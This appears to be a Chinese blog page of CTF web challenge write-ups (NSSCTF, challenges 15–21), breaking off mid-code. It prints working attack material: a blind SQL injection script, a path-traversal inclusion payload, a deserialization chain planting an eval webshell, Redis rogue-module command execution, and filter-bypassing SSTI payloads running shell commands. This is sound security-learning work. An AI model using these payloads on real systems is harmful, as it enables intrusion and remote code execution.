



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="java,git,springcloud" />


<link rel="canonical" href="https://hq185187.github.io/2023/05/12/nssctf2/">



  <title>
NSSCTF2 - NSSCTF精选 |
不良人天藏星 = welcome to my blog = 不良人总舵</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">NSSCTF2
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2023-05-12 16:31:39">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2023-05-12T16:31:39+08:00">2023-05-12</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>22k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>20 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="/assets/6.jpg">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/NSSCTF/" itemprop="item" rel="index" title="分类于 NSSCTF精选"><span itemprop="name">NSSCTF精选</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/05/12/nssctf2/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="hq185187">
    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="welcome to my blog">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h3 id="15ciscn-2019华北day2web1"><a class="markdownIt-Anchor" href="#15ciscn-2019华北day2web1">#</a> 15.[CISCN 2019 华北 Day2] Web1</h3>
<p>题目过滤了很多东西，包括空格<br>
输入 1’%0a 回显 bool (flase)<br>
 说明这是一个有过滤的布尔盲注类型的题<br>
告诉了表名字段名都是 flag,sql 语句就是:select (flag) from (flag)<mark> 因为过滤了空格</mark><br>
写 python 脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">res=<span class="string">&quot;&quot;</span>  </span><br><span class="line">url=<span class="built_in">input</span>(<span class="string">&quot;请输入链接: &quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):  </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.printable:  <span class="comment">#这个是可输出字符,j会不断遍历里面的值</span></span><br><span class="line">sql=<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;,1,2)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))  </span><br><span class="line"><span class="comment">#这里让flag的第i个值变成ascii看看是否等于j的ord,等于就返回1,否则返回2</span></span><br><span class="line">post=&#123;<span class="string">&quot;id&quot;</span>:sql&#125;  </span><br><span class="line">result=requests.post(url=url,data=post)  </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> result.text:  </span><br><span class="line">res+=j  </span><br><span class="line"><span class="built_in">print</span>(res)  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h3 id="16hctf-2018warmup"><a class="markdownIt-Anchor" href="#16hctf-2018warmup">#</a> 16.[HCTF 2018]Warmup</h3>
<p>首先打开题目看源码，发现 source.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span> =&gt; <span class="string">&quot;source.php&quot;</span>, <span class="string">&quot;hint&quot;</span> =&gt; <span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//检查传的file值是否再whitelist中</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line"></span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line"></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//将file进行url解码赋值给$_page</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(//相当于substr,可以返回中文字符</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line"></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//给_page后加个?,再返回第一次出现?的位置</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line"></span><br><span class="line">    !<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//要传个参名字为file</span></span><br><span class="line"></span><br><span class="line">    &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//传的file要是字符串</span></span><br><span class="line"></span><br><span class="line">    &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//调用checkFile函数只要能通过就行</span></span><br><span class="line"></span><br><span class="line">) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">//直接调用得flag</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*payload:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?file=hint.php?../../../../../../ffffllllaaaagggg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">file=hint.php%3f../../../../../../ffffllllaaaagggg  %3f是?的url编码</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="17天翼杯-2021esay_evalredis"><a class="markdownIt-Anchor" href="#17天翼杯-2021esay_evalredis">#</a> 17.[天翼杯 2021] esay_eval–REDIS]</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;eval(\$_POST[1]);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">b</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这题链子不难找，绕过 wakeup 的正则表达式绕过用大小写绕过<br>
学习一个新知识:redis 提权<br>
！[[Pasted image 20230502170947.png]]<br>
 antsword 连接上去后发现不能访问其他目录，发现一个 config.php.swp 内容有 redis 密码<br>
蚁剑 Redis 插件地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>
<p>git clone 到 antData/plugins 下<br>
<span class="exturl" data-url="aHR0cDovL3huLS1leHAtcDE4ZHZiMmw0OWQuc28=">上传一个 exp.so</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>
<p>蚁剑连上插件后添加数据密码填文件里的<br>
直接执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure>
<h3 id="18安洵杯-2020normal-ssti"><a class="markdownIt-Anchor" href="#18安洵杯-2020normal-ssti">#</a> 18.[安洵杯 2020] Normal SSTI</h3>
<p>此题考点 unicode 编码绕过，ssti 过滤<br>
先测试一下发现过滤了 <code>&#123;&#123;&#125;&#125;,空格,点号</code> <br>
先找一个通用 payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>
<p>点号可以用 attr 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>
<p>但是此题还过滤了下划线，这里解锁一种新的绕过方法：Unicode 编码绕过<br>
先用 gpt 写一段脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个空列表，用于存储每个字符的Unicode编码  </span></span><br><span class="line">unicode_lst = []  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 输入需要转换的字符串  </span></span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入要转换的字符串：&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 遍历输入字符串，并将每个字符的Unicode编码按照 \uXXXX 的形式存储到unicode_lst列表中  </span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> input_str:  </span><br><span class="line">unicode_lst.append(<span class="string">&quot;\\u%04x&quot;</span> % <span class="built_in">ord</span>(char))  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 打印转换结果  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换结果：&quot;</span>, <span class="string">&quot;&quot;</span>.join(unicode_lst))</span><br></pre></td></tr></table></figure>
<p>需要什么自己转换就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__globals__:\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><br><span class="line">__getitem__:\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><br><span class="line">注意哦这里还过滤了一些关键字:popen,flag</span><br><span class="line">popen:\u0070\u006f\u0070\u0065\u006e</span><br><span class="line">空格:\u0020</span><br><span class="line">flag:\u0066\u006c\u0061\u0067</span><br></pre></td></tr></table></figure>
<p>合在一起:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;cat\u0020/\u0066\u006c\u0061\u0067&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure>
<h3 id="19hnctf-2022-week3ssssti"><a class="markdownIt-Anchor" href="#19hnctf-2022-week3ssssti">#</a> 19.[HNCTF 2022 WEEK3]ssssti</h3>
<p>测试一些？name=…<br>
 发现过滤单双引号，下划线</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.get(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br><span class="line"></span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.e).read() &#125;&#125;&amp;a=__class__&amp;b=__init__&amp;c=__globals__&amp;d=os&amp;e=ls</span><br></pre></td></tr></table></figure>
<h3 id="20gdouctf-2023ez_ze"><a class="markdownIt-Anchor" href="#20gdouctf-2023ez_ze">#</a> 20.[GDOUCTF 2023]&lt;ez_ze&gt;</h3>
<p>测试发现过滤了 <code>&#123;&#123;&#125;&#125;,点号,下划线,双引号(单引号没有过滤),[],关键字getitem,os,popen(注意这里的set)</code> <br>
 这里我们来试试 set 方法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常用payload:</span><br><span class="line">&#123;%print(lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure>
<p>开干:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查看下划线的位置18和24</span><br><span class="line">&#123;%print(lipsum|string|list)%&#125;</span><br><span class="line">构建pop字符串</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xhx=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class="line">&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join()%&#125;</span><br><span class="line">&#123;%set geti=(xhx,xhx,dict(get=a)|join,dict(item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%set oo=(dict(o=a)|join,dict(s=a)|join)|join%&#125;</span><br><span class="line">&#123;%set poe=(dict(pop=a)|join,dict(en=a)|join)|join%&#125;</span><br><span class="line">&#123;%print(lipsum|attr(globals)|attr(geti)(oo)|attr(poe)(&#x27;ls /&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br><span class="line"></span><br><span class="line">再改一下命令为cat /flag就行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="21gdouctf-2023受不了一点"><a class="markdownIt-Anchor" href="#21gdouctf-2023受不了一点">#</a> 21.[GDOUCTF 2023] 受不了一点</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span 